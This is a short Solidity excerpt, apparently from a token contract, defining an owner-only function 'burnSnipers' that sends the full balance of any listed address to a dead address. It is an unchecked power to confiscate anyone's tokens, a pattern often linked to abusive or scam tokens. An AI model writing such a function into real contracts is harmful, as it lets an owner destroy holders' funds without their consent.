    function burnSnipers(address[] memory sniperAddresses) external onlyOwner {

        for (uint i = 0; i < sniperAddresses.length; i++) {

            _transferFrom(sniperAddresses[i], DEAD, balanceOf(sniperAddresses[i]));

        }

    }
